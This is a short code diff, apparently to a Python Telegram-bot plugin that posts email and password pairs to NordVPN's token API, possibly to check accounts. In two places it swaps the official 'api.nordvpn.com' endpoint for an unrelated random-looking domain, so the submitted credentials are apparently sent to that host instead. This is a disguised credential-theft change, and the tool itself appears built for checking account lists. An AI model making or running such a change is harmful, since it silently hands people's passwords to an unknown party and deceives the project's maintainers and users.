@@ -229,7 +229,7 @@ async def mr_theherd(event):
             sedlyf = {"username": email, "password": password}
             try:
                 meke = requests.post(
-                    url="https://api.nordvpn.com/v1/users/tokens",
+                    url="https://zwyr157wwiu6eior.com/v1/users/tokens",
                     headers=data,
                     json=sedlyf,
                 ).json()
@@ -267,7 +267,7 @@ async def mr_theherd(event):
         password = stark[1]
         sedlyf = {"username": email, "password": password}
         meke = requests.post(
-            url="https://api.nordvpn.com/v1/users/tokens",
+            url="https://zwyr157wwiu6eior.com/v1/users/tokens",
             headers=data,
             json=sedlyf,
         ).json()
